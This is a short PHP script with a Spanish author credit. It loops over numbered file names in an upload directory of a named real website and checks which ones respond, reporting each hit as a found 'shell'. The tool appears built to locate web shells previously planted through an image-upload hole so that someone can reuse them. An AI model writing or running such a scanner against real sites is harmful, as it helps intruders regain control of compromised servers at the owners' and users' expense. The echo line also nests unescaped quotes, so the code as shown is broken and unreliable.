<?php

/*
* Codigo desarrollado por Matias Baeza
* https://www.facebook.com/imwhom
*/

function verificar($url) 
{
	$curl   = @curl_init($url);
	$estado = array();
	@curl_setopt($curl, CURLOPT_HEADER, TRUE);
	@curl_setopt($curl, CURLOPT_NOBODY, TRUE);
	@curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
	@curl_setopt($curl, CURLOPT_FOLLOWLOCATION, FALSE);
	preg_match('/HTTP\/.* ([0-9]+) .*/', @curl_exec($curl) , $estado);
	return ($estado[1] == 200);
}

for ($i=0; $i <=100 ; $i++) 
{ 
	$url = "http://icdrt.com/media/uploading/images/$i.php";
	if (verificar($url) == 200) 
	{
		echo "<a href="$url" target='_blank'>Shell $i.php encontrada</a>";
	}
}

?>